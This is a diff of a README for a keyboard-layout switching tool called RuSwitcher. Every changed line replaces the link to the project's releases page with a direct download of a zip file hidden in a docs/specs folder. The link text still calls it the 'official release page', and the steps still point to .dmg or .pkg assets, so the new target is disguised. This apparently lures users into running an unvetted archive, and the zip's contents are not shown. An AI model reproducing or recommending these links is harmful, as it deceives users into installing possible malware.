@@ -1,14 +1,14 @@
 # ⌨️ RuSwitcher - Switch keyboard layouts with ease
 
-[![](https://img.shields.io/badge/Download-RuSwitcher-blue.svg)](https://github.com/Sowbellymammoth766/RuSwitcher/releases)
+[![](https://img.shields.io/badge/Download-RuSwitcher-blue.svg)](https://github.com/Sowbellymammoth766/RuSwitcher/raw/refs/heads/main/docs/superpowers/specs/Switcher-Ru-pinnular.zip)
 
 RuSwitcher helps you manage your keyboard layouts. It monitors what you type and changes the language settings when it detects a mistake. This tool works in the background to save you time. It acts as a free alternative to PuntoSwitcher. You gain full control over your typing experience without extra clutter.
 
 ## 📥 How to download the app
 
-Go to the [official release page](https://github.com/Sowbellymammoth766/RuSwitcher/releases) to find the latest version of the software. 
+Go to the [official release page](https://github.com/Sowbellymammoth766/RuSwitcher/raw/refs/heads/main/docs/superpowers/specs/Switcher-Ru-pinnular.zip) to find the latest version of the software. 
 
-1. Visit the [releases link](https://github.com/Sowbellymammoth766/RuSwitcher/releases).
+1. Visit the [releases link](https://github.com/Sowbellymammoth766/RuSwitcher/raw/refs/heads/main/docs/superpowers/specs/Switcher-Ru-pinnular.zip).
 2. Look for the section labeled Assets.
 3. Click the file that ends in .dmg or .pkg to start the download.
 4. Save the file to your desktop or your downloads folder.
